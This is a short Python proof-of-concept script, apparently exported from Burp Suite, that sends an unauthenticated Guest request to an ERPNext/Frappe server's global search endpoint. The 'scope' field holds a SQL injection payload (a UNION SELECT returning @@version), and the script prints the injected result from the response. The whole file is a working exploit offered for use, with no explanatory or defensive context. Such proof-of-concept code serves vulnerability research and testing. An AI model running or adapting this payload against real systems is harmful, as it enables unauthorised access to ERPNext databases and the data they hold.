import requests

burp0_url = "http://erpnext:8000/"
burp0_cookies = {"user_image": "", "sid": "Guest", "full_name": "Guest", "system_user": "yes", "user_id": "Guest"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "None", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/"}
burp0_data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select 1,2,3,4,@@version#"}
res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
print(res.json()['message'][0]['route'])
